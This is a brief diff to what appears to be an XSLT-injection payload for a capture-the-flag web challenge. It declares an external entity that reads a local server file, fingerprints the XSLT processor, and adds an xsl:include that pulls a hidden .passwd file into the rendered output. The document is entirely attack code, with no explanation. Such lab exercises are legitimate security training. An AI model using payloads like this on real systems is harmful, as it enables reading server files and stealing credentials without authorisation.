@@ -3,6 +3,8 @@
   <!ENTITY passwd SYSTEM "file:///challenge/web-serveur/ch50/style1.xsl">]>
 <html xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" xsl:version="1.0">
 <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
+  <xsl:include href=".passwd" />
+
 <xsl:for-each select="beers/beer">
 <xsl:value-of select="system-property('xsl:vendor')">
 </xsl:value-of>
